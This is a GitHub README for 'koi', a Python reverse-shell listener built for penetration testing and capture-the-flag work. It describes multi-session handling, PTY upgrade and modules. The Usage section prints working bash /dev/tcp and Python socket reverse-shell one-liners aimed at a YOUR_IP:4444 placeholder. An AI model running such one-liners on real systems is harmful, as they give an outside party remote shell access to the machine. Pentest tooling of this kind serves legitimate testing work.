# koi 🎏
![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![GitHub last commit (branch)](https://img.shields.io/github/last-commit/b3rt1ng/Koi/main?style=for-the-badge&color=rgb(235%2C%20111%2C%20%2092)) ![GitHub Repo stars](https://img.shields.io/github/stars/b3rt1ng/Koi?style=for-the-badge&labelColor=(169%2C%20169%2C%20169)&color=rgb(255%2C%20116%2C%200)) 


This project is my shot at making a fast, easy to use (yet feature rich) shell handler with a pretty interface.

Disclaimer: please note that this is still under development, and I am still working on some of the key features, wich is talked about in [this section](#-wip).

---

### Demo

<img src="https://i.imgur.com/nUAtJf5.gif">

---

## ✨ Features

* **Multi-session**: Handles multiple reverse shells simultaneously list, switch, and background sessions without dropping any.
* **PTY Upgrade**: Upgrades a raw shell to a full PTY for proper tab completion, Ctrl+C forwarding, and terminal resizing.
* **Clean signals**: `Ctrl+Z` backgrounds the session, `Ctrl+C` sends `SIGINT` to the remote never kills your listener by accident.
* **Koi fish themed UI**: Gradient prompt, status indicators, and session boxes, pentest tooling doesn't have to be ugly.

## 🚧 WIP
* **Windows**: Currently working on a reliable way to handle windows shell, i'm also thinking about how odules should handle different shells. Mhhhhhh decisions decisions...
* **Tunneling**: Once you have your shell, a simple way to tunnel in that network would be very conveinient, this has yet to be done.
* **Modules**: I consider this part is still under WIP since i'm experimenting ways to make it reliable yet easy to implement for you guys, as of now it is more than usable.
* **Testings**: I've tried my tool on CTF and personal devices but it still needs more testing. As of now, this has been made for linux based shells but I want it to be able to work under windows powershell with all it's implications.
---

## 🚀 Installation

```bash
# directly from the repo
pipx install git+https://github.com/b3rt1ng/Koi

# or pypi
pipx install koi-handler

# From source if you want to dev your own modules
git clone https://github.com/b3rt1ng/koi
cd koi
pipx install --editable .
```

---

## 💻 Usage

### Start the listener

```bash
# Default: bind 0.0.0.0:4444
koi

# Custom host/port
koi --host 10.10.14.5 --port 9001
koi -p 9001
```

### Catch a shell

Send a reverse shell from your target. Examples:

```bash
# bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python PTY
python3 -c "import os,pty,socket;s=socket.socket();s.connect(('YOUR_IP',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"
```
But juste type `payloads *interface*` to get pregenerated payloads ;)

---

## 🐚 Listener commands

Once `koi` is running, you are presented with a control terminal:

| Command | Description |
|---|---|
| `ls` | List all active sessions |
| `go <id>` | Enter a session interactively |
| `upgrade <id>` | Upgrade session to a full PTY |
| `kill <id>` | Terminate and remove a session |
| `modules` | List all modules |
| `run <module_name> <id> [args_if_needed]` | Run a module on a terget |
| `help` | Show available commands |
| `exit` | Shut down the listener |

---

## 🔧 PTY Upgrade

Raw shells lack proper terminal support — no tab completion, broken `Ctrl+C`, mangled output. The `upgrade` command fixes this:

```
koi> upgrade 1
  Shell #1 upgraded successfully.
koi> go 1
  # now a full PTY with proper terminal behaviour
```

Under the hood it runs:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
with `TERM=xterm-256color` and some resizing info

### 🤖 Modules

Modules are basically a way to automate actions on your instances. you can run commands, and take advantage of your python backend.

Checkout the [blueprint](src/koi/modules/blueprint.py) to see how you can make your own module or check our examples ([linpeas](src/koi/modules/linpeas.py), [get users](src/koi/modules/get_users.py)) to get insiprations

Also, if you want to make your own module part of this repo, do not hesitate to make a PR, I will gladly look at it and see if it's interesting to add here <3
<div align="center">
  <img src="https://media1.tenor.com/m/pTHWYc7b8TsAAAAd/smiling-friends-dab.gif">
</div>